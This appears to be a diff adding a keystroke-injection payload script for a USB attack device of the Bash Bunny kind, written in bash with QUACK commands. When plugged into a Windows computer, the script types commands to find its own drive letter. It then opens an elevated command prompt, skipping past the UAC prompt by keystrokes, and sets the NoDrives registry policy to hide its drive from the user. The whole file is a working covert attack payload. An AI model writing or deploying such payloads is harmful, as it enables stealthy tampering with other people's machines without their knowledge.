@@ -1,0 +1,123 @@
+#!/bin/bash
+
+# Initialize USB gadgets
+if [ ! -d "/sys/kernel/config/usb_gadget/g1" ]; then
+    ATTACKMODE
+fi
+
+sleep 5
+
+# Get drive letter
+QUACK GUI r
+QUACK STRING "cmd"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "for /f %d in ('wmic volume get driveletter^, label ^| findstr \"PITAP\"') do echo %d > %d\DRIVE_LETTER"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "exit"
+QUACK ENTER
+
+sleep 2
+
+umount /PiTap/storage/system.img
+mount /PiTap/storage/system.img /PiTap/mnt
+mkdir -p /PiTap/loot
+mv /PiTap/mnt/DRIVE_LETTER /PiTap/loot
+umount /PiTap/
+
+# Hide the drive
+drive=$(</PiTap/loot/DRIVE_LETTER)
+
+case $drive in
+	A:)
+		drive_id="1"
+		;;
+	B:)
+		drive_id="2"
+		;;
+	C:)
+		drive_id="4"
+		;;
+	D:)
+		drive_id="8"
+		;;
+	E:)
+		drive_id="16"
+		;;
+	F:)
+		drive_id="32"
+		;;
+	G:)
+		drive_id="64"
+		;;
+	H:)
+		drive_id="128"
+		;;
+	I:)
+		drive_id="256"
+		;;
+	J:)
+		drive_id="512"
+		;;
+	K:)
+		drive_id="1024"
+		;;
+	L:)
+		drive_id="2048"
+		;;
+	M:)
+		drive_id="4096"
+		;;
+	N:)
+		drive_id="8192"
+		;;
+	O:)
+		drive_id="16384"
+		;;
+	P:)
+		drive_id="32768"
+		;;
+	Q:)
+		drive_id="65536"
+		;;
+	R:)
+		drive_id="131072"
+		;;
+	S:)
+		drive_id="262144"
+		;;
+	T:)
+		drive_id="524288"
+		;;
+	U:)
+		drive_id="1048576"
+		;;
+	V:)
+		drive_id="2097152"
+		;;
+	W:)
+		drive_id="4194304"
+		;;
+	X:)
+		drive_id="8388608"
+		;;
+	Y:)
+		drive_id="16777216"
+		;;
+	Z:)
+		drive_id="33554432"
+		;;
+esac
+
+QUACK GUI r
+QUACK DELAY 50
+QUACK STRING cmd
+QUACK CTRL-SHIFT ENTER
+QUACK DELAY 500
+QUACK ALT-SHIFT TAB
+QUACK DELAY 50
+QUACK STRING "REG ADD \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /t REG_DWORD /v NoDrives /d \"${drive_id}\" /f"
+QUACK ENTER
+QUACK STRING "exit"
+QUACK ENTER
